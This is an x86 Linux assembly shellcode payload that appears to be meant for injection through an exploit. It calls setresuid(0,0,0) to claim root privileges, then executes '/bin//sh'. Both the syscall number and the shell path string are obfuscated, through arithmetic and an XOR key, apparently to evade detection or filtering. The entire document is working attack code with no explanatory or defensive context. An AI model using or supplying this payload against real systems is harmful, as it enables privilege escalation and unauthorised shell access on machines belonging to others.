global _start

section .text
  _start:
    ; setresuid(0,0,0)
    lea     eax, [0xab32a1a5]
    sub     eax, 0xab32a101
    cdq
    mov     ebx, edx
    mov     ecx, ebx
    int     0x80

    ; execve("/bin//sh", ["/bin//sh", NULL], [NULL])
    push    ebx
    xor     eax, eax
    mov     al, 0xb
    mov     edi, 0xd34db3ef
    mov     ebx, 0xbb3e9cc0
    xor     ebx, edi
    push    ebx
    mov     ebx, 0xbd24d1c0
    xor     ebx, edi
    push    ebx
    push    edx
    lea     ebx, [esp + 4]
    int     0x80
